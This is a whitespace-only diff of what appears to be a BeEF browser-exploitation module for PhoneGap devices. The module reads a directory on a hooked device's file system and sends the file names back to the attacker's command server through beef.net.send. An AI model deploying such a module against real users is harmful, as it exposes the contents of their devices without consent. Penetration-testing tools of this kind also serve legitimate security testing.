@@ -12,18 +12,18 @@ beef.execute(function() {
 
     function fail() {
         result = 'fail';
-        
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );	
+
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
     }
 
     function success(entries) {
         var i;
         for (i=0; i<entries.length; i++) {
-            result = result + '\n ' + entries[i].name;        
+            result = result + '\n ' + entries[i].name;
         }
 
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );	
-    } 
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
+    }
 
     // use directoryentry to create directory reader
     function gotDirEntry(dirEntry) {
@@ -31,11 +31,11 @@ beef.execute(function() {
         directoryReader.readEntries(success,fail);
     }
 
-    // use getDirectoy to create reference to directoryentry 
+    // use getDirectoy to create reference to directoryentry
     function gotFS(fileSystem) {
         fileSystem.root.getDirectory(directory, null, gotDirEntry, fail);
     }
-   
+
     window.requestFileSystem(LocalFileSystem.PERSISTENT, 0, gotFS, fail);
 
 });
